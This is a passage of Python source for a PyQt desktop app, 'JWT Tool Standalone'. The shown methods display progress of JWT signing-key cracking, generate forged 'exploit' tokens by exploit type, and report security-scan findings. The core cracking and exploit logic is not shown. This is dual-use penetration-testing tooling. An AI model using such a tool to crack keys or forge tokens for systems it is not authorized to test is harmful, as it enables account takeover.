        if self.cracking_thread:
            self.cracking_thread.stop()
            self.crack_output.append("Stopping crack attempt...")
    
    def update_crack_progress(self, current, total):
        """Update cracking progress"""
        if total > 0:
            percentage = int((current * 100) / total)
            self.crack_progress.setValue(percentage)
            
            # Update output periodically
            if current % 1000 == 0 or current == total:
                self.crack_output.append(f"Tried {current}/{total} passwords ({percentage}%)")
    
    def crack_finished(self, result):
        """Handle cracking completion"""
        self.crack_btn.setEnabled(True)
        self.stop_crack_btn.setEnabled(False)
        self.crack_progress.setValue(100)
        
        output = "\n=== CRACKING RESULTS ===\n\n"
        
        if result.get('found'):
            output += f"✓ SUCCESS! Key found: {result['key']}\n"
            output += f"Attempts: {result.get('attempts', 'Unknown')}\n"
            logger.info(f"JWT cracked successfully: {result['key']}")
        elif result.get('error'):
            output += f"✗ Error: {result['error']}\n"
            logger.error(f"JWT cracking error: {result['error']}")
        else:
            output += f"✗ Key not found\n"
            output += f"Attempts: {result.get('attempts', 'Unknown')}\n"
            logger.info("JWT cracking completed - no key found")
        
        self.crack_output.append(output)
        self.cracking_thread = None
    
    def generate_exploit(self):
        """Generate JWT exploit"""
        try:
            token = self.exploit_input.toPlainText().strip()
            exploit_type = self.exploit_combo.currentText()
            
            if not token:
                self.show_error("Please enter a JWT token")
                return
            
            result = JWTCore.exploit_jwt(token, exploit_type)
            
            output = f"=== EXPLOIT: {exploit_type.upper()} ===\n\n"
            
            if result['success']:
                output += f"✓ Exploit generated successfully\n\n"
                if 'tokens' in result:
                    output += f"Generated Tokens ({len(result['tokens'])}):\n"
                    for i, token in enumerate(result['tokens'], 1):
                        output += f"{i}. {token}\n"
                output += f"\nNotes: {result.get('notes', 'No additional notes')}\n"
                logger.info(f"Exploit generated: {exploit_type}")
            else:
                output += f"✗ Exploit failed: {result.get('error', 'Unknown error')}\n"
                logger.error(f"Exploit failed: {exploit_type}")
            
            self.exploit_output.setPlainText(output)
            
        except Exception as e:
            self.show_error(f"Exploit generation failed: {str(e)}")
    
    def run_security_scan(self):
        """Run security scan on JWT"""
        try:
            token = self.scan_input.toPlainText().strip()
            scan_mode = self.scan_mode_combo.currentText()
            
            if not token:
                self.show_error("Please enter a JWT token")
                return
            
            result = JWTCore.scan_jwt(token, scan_mode)
            
            output = f"=== SECURITY SCAN: {scan_mode.upper()} ===\n\n"
            
            # Token info
            if 'token_info' in result:
                info = result['token_info']
                output += f"TOKEN INFORMATION:\n"
                output += f"Algorithm: {info.get('algorithm', 'Unknown')}\n"
                output += f"Type: {info.get('type', 'Unknown')}\n"
                if info.get('key_id'):
                    output += f"Key ID: {info['key_id']}\n"
                output += f"Claims: {', '.join(info.get('claims', []))}\n"
                if info.get('issuer'):
                    output += f"Issuer: {info['issuer']}\n"
                if info.get('subject'):
                    output += f"Subject: {info['subject']}\n"
                if info.get('expires_at'):
                    exp_time = datetime.fromtimestamp(info['expires_at'])
                    output += f"Expires: {exp_time}\n"
                output += "\n"
            
            # Vulnerabilities
            if result.get('vulnerabilities'):
                output += f"🚨 VULNERABILITIES FOUND ({len(result['vulnerabilities'])}):\n"
                for vuln in result['vulnerabilities']:
                    output += f"- {vuln['title']}: {vuln['details']}\n"
                    output += f"  Impact: {vuln['impact']}\n"
                output += "\n"
            else:
                output += "✓ No critical vulnerabilities found\n\n"
            
            # Warnings
            if result.get('warnings'):
                output += f"⚠️  WARNINGS ({len(result['warnings'])}):\n"
                for warning in result['warnings']:
                    output += f"- {warning['message']}\n"
                    if 'recommendation' in warning:
                        output += f"  Recommendation: {warning['recommendation']}\n"
                output += "\n"
            
            # Info
            if result.get('info'):
                output += f"ℹ️  INFORMATION:\n"
                for info in result['info']:
                    output += f"- {info}\n"
                output += "\n"
            
            # Summary
            vuln_count = len(result.get('vulnerabilities', []))
            warn_count = len(result.get('warnings', []))
            
            output += f"=== SCAN SUMMARY ===\n"
            output += f"Vulnerabilities: {vuln_count}\n"
            output += f"Warnings: {warn_count}\n"
            
            if vuln_count == 0 and warn_count == 0:
                output += f"Status: ✓ SECURE\n"
            elif vuln_count > 0:
                output += f"Status: 🚨 VULNERABLE\n"
            else:
                output += f"Status: ⚠️  WARNINGS\n"
            
            self.scan_output.setPlainText(output)
            logger.info(f"Security scan completed: {vuln_count} vulns, {warn_count} warnings")
            
        except Exception as e:
            self.show_error(f"Security scan failed: {str(e)}")
    
    def show_error(self, message):
        """Show error message"""
        QMessageBox.critical(self, "Error", message)
        logger.error(message)
    
    def show_info(self, message):
        """Show info message""" 
        QMessageBox.information(self, "Information", message)
        logger.info(message)


def main():
    """Main application entry point"""
    app = QApplication(sys.argv)
    app.setApplicationName("JWT Tool Standalone")
    app.setApplicationVersion("2.0.0")
    
    # Check dependencies
    missing_deps = []
    if not CRYPTO_AVAILABLE:
        missing_deps.append("pycryptodomex (for advanced cryptographic operations)")
    if not REQUESTS_AVAILABLE:
        missing_deps.append("requests (for network operations)")
    
    if missing_deps:
        msg = "Some optional dependencies are missing:\n\n"
        msg += "\n".join(f"- {dep}" for dep in missing_deps)
        msg += "\n\nBasic functionality will still work, but some features may be limited."
        print(msg)
    
    # Create and show main window
    window = JWTToolGUI()
    window.show()
    
    logger.info("JWT Tool Standalone started successfully")
    return app.exec_()


if __name__ == '__main__':
    sys.exit(main())
